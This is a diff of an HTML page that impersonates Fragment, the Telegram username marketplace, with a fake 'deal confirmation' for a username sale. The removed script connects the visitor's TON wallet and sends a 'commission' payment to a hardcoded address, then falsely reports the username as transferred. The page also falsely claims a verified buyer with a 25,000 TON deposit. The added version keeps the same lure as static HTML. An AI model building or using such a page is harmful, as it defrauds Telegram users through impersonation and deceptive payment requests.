@@ -1,463 +1,280 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Fragment | Username Exchange</title>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
+    <title>Fragment Deal Confirmation</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        :root {
-            --primary: #0088cc;           /* Основной голубой цвет Fragment */
-            --primary-light: #4da6ff;     /* Светлый голубой */
-            --bg-light: #f8f9fa;          /* Светлый фон */
-            --text-primary: #212529;      /* Основной текст */
-            --text-secondary: #6c757d;    /* Вторичный текст */
-            --border: #e0e0e0;            /* Границы */
-            --success: #28a745;           /* Цвет успеха */
-        }
-        
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
         }
         
         body {
-            background-color: #ffffff;
-            color: var(--text-primary);
+            background: linear-gradient(135deg, #f0f5ff 0%, #f8f9ff 100%);
+            color: #1a1d28;
             line-height: 1.6;
-            font-size: 15px;
-            padding: 0;
-            -webkit-font-smoothing: antialiased;
+            padding: 20px;
+            min-height: 100vh;
         }
         
         .container {
             max-width: 500px;
             margin: 0 auto;
-            padding: 20px;
+            background: white;
+            border-radius: 24px;
+            overflow: hidden;
+            box-shadow: 0 15px 50px rgba(0, 10, 80, 0.08);
         }
         
-        /* Шапка Fragment */
-        .fragment-header {
+        header {
+            background: #0088cc;
+            color: white;
+            padding: 24px 20px;
             text-align: center;
-            padding: 15px 0 25px;
-            border-bottom: 1px solid var(--border);
+            position: relative;
         }
         
-        .logo {
-            font-size: 28px;
-            font-weight: 700;
-            color: var(--primary);
-            letter-spacing: -0.5px;
-            margin-bottom: 5px;
+        .back-btn {
+            position: absolute;
+            left: 20px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: white;
+            font-size: 20px;
         }
         
-        .subheader {
-            font-size: 16px;
-            color: var(--text-secondary);
-        }
-        
-        /* Основной контент */
-        .section {
-            padding: 25px 0;
-            border-bottom: 1px solid var(--border);
-        }
-        
-        .badge {
-            display: inline-block;
-            background-color: #e6f7ff;
-            color: var(--primary);
-            font-size: 14px;
-            font-weight: 500;
-            padding: 5px 12px;
-            border-radius: 12px;
-            margin-bottom: 15px;
-        }
-        
-        .username-title {
-            font-size: 24px;
-            font-weight: 700;
-            margin: 10px 0 25px;
-            color: var(--text-primary);
-        }
-        
-        .pricing-table {
-            width: 100%;
-            border-collapse: collapse;
-            margin-bottom: 25px;
-        }
-        
-        .pricing-table th {
-            text-align: left;
-            font-weight: 500;
-            color: var(--text-secondary);
-            padding-bottom: 8px;
-            font-size: 15px;
-        }
-        
-        .pricing-table td {
-            padding: 6px 0;
+        h1 {
+            font-size: 20px;
             font-weight: 600;
+        }
+        
+        .section {
+            padding: 24px 20px;
+            border-bottom: 1px solid #eef1f7;
+        }
+        
+        h2 {
             font-size: 18px;
+            font-weight: 700;
+            margin-bottom: 16px;
+            color: #1a1d28;
         }
         
-        .dollar-value {
-            font-weight: 400;
-            font-size: 15px;
-            color: var(--text-secondary);
+        .fragment-card {
+            background: #f7f9ff;
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 20px;
         }
         
-        /* Информационные блоки */
-        .info-section {
-            margin: 25px 0;
+        .deal-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 12px;
+            font-size: 17px;
         }
         
-        .info-item {
-            margin-bottom: 18px;
+        .deal-price {
+            font-weight: 700;
+            color: #1a1d28;
+        }
+        
+        .how-works {
+            color: #0088cc;
+            text-decoration: none;
+            font-weight: 500;
+            display: inline-block;
+            margin-top: 8px;
+            font-size: 16px;
+        }
+        
+        .info-grid {
+            display: grid;
+            grid-template-columns: max-content 1fr;
+            gap: 12px 20px;
+            font-size: 16px;
         }
         
         .info-label {
-            font-size: 15px;
-            color: var(--text-secondary);
-            margin-bottom: 5px;
-            font-weight: 500;
+            color: #6b7280;
         }
         
         .info-value {
-            font-size: 17px;
             font-weight: 500;
-            color: var(--text-primary);
+            color: #1a1d28;
         }
         
-        .info-value.address {
+        .ton-address {
             font-family: monospace;
-            font-size: 16px;
-            color: var(--primary);
+            word-break: break-all;
         }
         
-        /* Кнопка */
-        .action-btn {
-            background-color: var(--primary);
-            color: white;
-            border: none;
-            border-radius: 10px;
+        .kyc-note {
+            background: #f0f7ff;
+            border-radius: 12px;
             padding: 16px;
+            font-size: 15px;
+            color: #1a1d28;
+            margin: 20px 0;
+            line-height: 1.5;
+        }
+        
+        .kyc-note i {
+            color: #00b894;
+            margin-right: 8px;
+        }
+        
+        .btn {
+            display: block;
             width: 100%;
-            font-size: 18px;
+            padding: 18px;
+            border-radius: 14px;
+            border: none;
+            font-size: 17px;
             font-weight: 600;
             cursor: pointer;
-            margin: 30px 0 15px;
-            transition: background-color 0.2s;
+            transition: all 0.2s ease;
+            text-align: center;
         }
         
-        .action-btn:hover {
-            background-color: #0073b1;
+        .btn-primary {
+            background: #0088cc;
+            color: white;
+            box-shadow: 0 4px 15px rgba(0, 136, 204, 0.25);
         }
         
-        /* Примечание */
-        .note-section {
-            background-color: #f1f8ff;
-            border-radius: 10px;
-            padding: 20px;
-            margin: 25px 0;
-            border-left: 3px solid var(--primary);
+        .btn-primary:hover {
+            background: #0077b3;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(0, 136, 204, 0.35);
         }
         
-        .note-content {
-            font-size: 14px;
-            color: var(--text-secondary);
-            line-height: 1.7;
-        }
-        
-        .note-highlight {
-            color: var(--text-primary);
-            font-weight: 600;
-        }
-        
-        /* Торговая информация */
-        .trade-table {
-            width: 100%;
-            border-collapse: collapse;
-            margin-top: 25px;
-        }
-        
-        .trade-table th {
-            text-align: left;
-            font-weight: 500;
-            color: var(--text-secondary);
-            padding-bottom: 10px;
+        .subscribe {
+            display: flex;
+            align-items: center;
+            margin-top: 16px;
             font-size: 15px;
         }
         
-        .trade-table td {
-            padding: 8px 0;
-            font-weight: 500;
-            font-size: 16px;
+        .subscribe input {
+            margin-right: 10px;
+            accent-color: #0088cc;
         }
         
-        .status-ready {
-            color: var(--success);
+        .trade-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            font-size: 15px;
+        }
+        
+        .trade-status {
+            color: #00b894;
             font-weight: 600;
         }
         
-        .address-value {
-            font-family: monospace;
+        .status-badge {
+            display: inline-block;
+            padding: 4px 10px;
+            border-radius: 20px;
+            background: rgba(0, 184, 148, 0.15);
             font-size: 14px;
-            color: var(--primary);
+            font-weight: 600;
         }
         
-        /* Лоадер */
-        .loader {
-            border: 4px solid rgba(0, 0, 0, 0.1);
-            border-top: 4px solid var(--primary);
-            border-radius: 50%;
-            width: 30px;
-            height: 30px;
-            animation: spin 1s linear infinite;
-            margin: 25px auto;
-            display: none;
-        }
-        
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        
-        .update-text {
-            text-align: center;
-            font-size: 14px;
-            color: var(--text-secondary);
-            margin-top: 10px;
+        @media (max-width: 480px) {
+            body {
+                padding: 10px;
+                background: white;
+            }
+            
+            .container {
+                border-radius: 20px;
+                box-shadow: none;
+            }
+            
+            .section {
+                padding: 20px 16px;
+            }
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <!-- Шапка Fragment -->
-        <div class="fragment-header">
-            <div class="logo">FRAGMENT</div>
-            <div class="subheader">Search usernames</div>
-        </div>
+        <header>
+            <a href="#" class="back-btn"><i class="fas fa-arrow-left"></i></a>
+            <h1>Request Info</h1>
+        </header>
         
-        <!-- Секция с информацией о сделке -->
         <div class="section">
-            <div class="badge">
-                <i class="fas fa-sync-alt"></i> Deal In Progress
+            <h2>FRAGMENT</h2>
+            <div class="fragment-card">
+                <div class="deal-row">
+                    <span>Search usernames</span>
+                </div>
+                <div class="deal-row">
+                    <span>Deal Price</span>
+                    <span class="deal-price">💹1800</span>
+                </div>
+                <div class="deal-row">
+                    <span>Commission</span>
+                    <span class="deal-price">💹90</span>
+                </div>
+                <div class="deal-row">
+                    <span></span>
+                    <span class="deal-price">$5344.47</span>
+                </div>
+                <div class="deal-row">
+                    <span></span>
+                    <span class="deal-price">$267.22</span>
+                </div>
+                
+                <a href="#" class="how-works">How does this work?</a>
             </div>
             
-            <div class="username-title" id="usernameDisplay">biruk.t.me</div>
-            
-            <table class="pricing-table">
-                <tr>
-                    <th>Deal Price</th>
-                    <th>Commission</th>
-                </tr>
-                <tr>
-                    <td>
-                        <div id="priceDisplay">100 TON</div>
-                        <div class="dollar-value" id="priceDollar">~ $522.00</div>
-                    </td>
-                    <td>
-                        <div id="commissionDisplay">5 TON</div>
-                        <div class="dollar-value" id="commissionDollar">~ $26.10</div>
-                    </td>
-                </tr>
-            </table>
-            
-            <div class="info-section">
-                <div class="info-item">
-                    <div class="info-label">How does this work?</div>
-                </div>
-                <div class="info-item">
-                    <div class="info-label">Telegram Username</div>
-                    <div class="info-value" id="usernameText">@biruk</div>
-                </div>
-                <div class="info-item">
-                    <div class="info-label">Web Address</div>
-                    <div class="info-value">t.me/<span id="usernameLink">biruk</span></div>
-                </div>
-                <div class="info-item">
-                    <div class="info-label">TON Web 3.0 Address</div>
-                    <div class="info-value address" id="tonAddress">biruk.t.me</div>
-                </div>
+            <div class="info-grid">
+                <span class="info-label">Telegram Username</span>
+                <span class="info-value">@cammiliss</span>
+                
+                <span class="info-label">Web Address</span>
+                <span class="info-value">t.me/cammiliss</span>
+                
+                <span class="info-label">TON Web 3.0 Address</span>
+                <span class="info-value ton-address">cammiliss.t.me</span>
             </div>
         </div>
         
-        <!-- Кнопка действия -->
-        <button class="action-btn" id="startExchange">
-            Start Exchange
-        </button>
-        
-        <div class="loader" id="loader"></div>
-        
-        <div class="update-text">
-            <i class="fas fa-bell"></i> Subscribe to updates
-        </div>
-        
-        <!-- Примечание о KYC -->
-        <div class="note-section">
-            <div class="note-content">
-                You do not need to complete KYC verification, as the buyer is a verified merchant on a Fragment that has a security deposit of <span class="note-highlight">25,000 TON</span>.
+        <div class="section">
+            <button class="btn btn-primary">Start Exchange</button>
+            
+            <div class="subscribe">
+                <input type="checkbox" id="subscribe" checked>
+                <label for="subscribe">Subscribe to updates</label>
+            </div>
+            
+            <div class="kyc-note">
+                <i class="fas fa-shield-alt"></i>
+                You do not need to complete KYC verification, as the buyer is a verified merchant on a Fragment that has a security deposit of ⬆25,000.
             </div>
         </div>
         
-        <!-- Торговая информация -->
-        <table class="trade-table">
-            <tr>
-                <th>Deal Status</th>
-                <th>TON - Username</th>
-                <th>Recipient</th>
-            </tr>
-            <tr>
-                <td class="status-ready">Ready</td>
-                <td>Swappable</td>
-                <td class="address-value" id="recipientAddress">Ef_BbsF16B4aReCFhXIO...</td>
-            </tr>
-        </table>
+        <div class="section">
+            <h2>Trade Info</h2>
+            <div class="trade-grid">
+                <span class="info-label">Deal Status</span>
+                <span class="trade-status"><span class="status-badge">Ready</span></span>
+                
+                <span class="info-label">TON – Username</span>
+                <span class="info-value">Swappable</span>
+                
+                <span class="info-label">Recipient</span>
+                <span class="info-value ton-address">Ef_BbsF16B4aReCFM</span>
+            </div>
+        </div>
     </div>
-
-    <script>
-        // Инициализация Telegram WebApp
-        const Telegram = window.Telegram.WebApp;
-        let tonConnect;
-        
-        try {
-            tonConnect = new TonConnectSDK.TonConnect();
-        } catch (e) {
-            console.error("TON Connect initialization error:", e);
-        }
-        
-        // Установка светлой темы
-        Telegram.setHeaderColor('#ffffff');
-        Telegram.setBackgroundColor('#ffffff');
-        
-        // Показываем загрузчик
-        function showLoader(show) {
-            const loader = document.getElementById('loader');
-            const startBtn = document.getElementById('startExchange');
-            if (loader) loader.style.display = show ? 'block' : 'none';
-            if (startBtn) startBtn.disabled = show;
-        }
-        
-        // Парсинг параметров запуска
-        function parseStartParams() {
-            try {
-                if (Telegram.initDataUnsafe && Telegram.initDataUnsafe.start_param) {
-                    const params = Telegram.initDataUnsafe.start_param.split('-');
-                    return {
-                        username: params[0] || 'biruk',
-                        price: params[1] || '100',
-                        commission: params[2] || '5'
-                    };
-                }
-            } catch (e) {
-                console.error("Error parsing start params:", e);
-            }
-            
-            return {
-                username: 'biruk',
-                price: '100',
-                commission: '5'
-            };
-        }
-        
-        // Обновление интерфейса
-        function updateUI() {
-            const { username, price, commission } = parseStartParams();
-            
-            // Обновляем элементы
-            document.getElementById('usernameDisplay').textContent = `${username}.t.me`;
-            document.getElementById('usernameText').textContent = `@${username}`;
-            document.getElementById('usernameLink').textContent = username;
-            document.getElementById('priceDisplay').textContent = `${price} TON`;
-            document.getElementById('commissionDisplay').textContent = `${commission} TON`;
-            document.getElementById('tonAddress').textContent = `${username}.t.me`;
-            
-            // Рассчитываем стоимость в долларах (курс 1 TON = $5.22)
-            const priceDollar = (parseFloat(price) * 5.22).toFixed(2);
-            const commissionDollar = (parseFloat(commission) * 5.22).toFixed(2);
-            document.getElementById('priceDollar').textContent = `~ $${priceDollar}`;
-            document.getElementById('commissionDollar').textContent = `~ $${commissionDollar}`;
-            
-            // Форматируем адрес получателя
-            const fullAddress = "Ef_BbsF16B4aReCFhXIO1234567890abcdef";
-            const formattedAddress = `${fullAddress.substring(0, 10)}...${fullAddress.substring(fullAddress.length - 10)}`;
-            document.getElementById('recipientAddress').textContent = formattedAddress;
-        }
-        
-        // Обработка кнопки Start Exchange
-        document.getElementById('startExchange').addEventListener('click', async () => {
-            showLoader(true);
-            
-            try {
-                // Проверяем доступность TON Connect
-                if (!tonConnect) {
-                    Telegram.showAlert("TON Connect is not available. Please update Telegram.");
-                    return;
-                }
-                
-                // Подключаем кошелек
-                if (!tonConnect.wallet) {
-                    try {
-                        await tonConnect.connectWallet();
-                    } catch (e) {
-                        Telegram.showAlert("Wallet connection failed: " + e.message);
-                        showLoader(false);
-                        return;
-                    }
-                }
-                
-                // Создаем транзакцию
-                const transaction = {
-                    validUntil: Math.floor(Date.now() / 1000) + 600,
-                    messages: [
-                        {
-                            address: "Ef_BbsF16B4aReCFhXIO1234567890abcdef",
-                            amount: `${parseInt(parseStartParams().commission) * 1000000000}`
-                        }
-                    ]
-                };
-                
-                // Отправляем транзакцию
-                try {
-                    const result = await tonConnect.wallet.sendTransaction(transaction);
-                    
-                    if (result && result.boc) {
-                        // Успешная транзакция
-                        const btn = document.getElementById('startExchange');
-                        btn.textContent = '✓ Transaction Completed';
-                        btn.style.background = 'var(--success)';
-                        btn.disabled = true;
-                        
-                        // Показываем уведомление
-                        Telegram.showAlert("✅ Payment successful! Username transferred.");
-                        
-                        // Закрываем приложение через 2 секунды
-                        setTimeout(() => {
-                            Telegram.close();
-                        }, 2000);
-                    } else {
-                        Telegram.showAlert("⚠️ Payment failed. Please try again.");
-                    }
-                } catch (error) {
-                    Telegram.showAlert(`❌ Transaction error: ${error.message}`);
-                }
-                
-            } catch (error) {
-                Telegram.showAlert(`❌ Error: ${error.message}`);
-            } finally {
-                showLoader(false);
-            }
-        });
-        
-        // Инициализация приложения
-        Telegram.ready();
-        Telegram.expand();
-        Telegram.BackButton.hide();
-        updateUI();
-    </script>
 </body>
 </html>
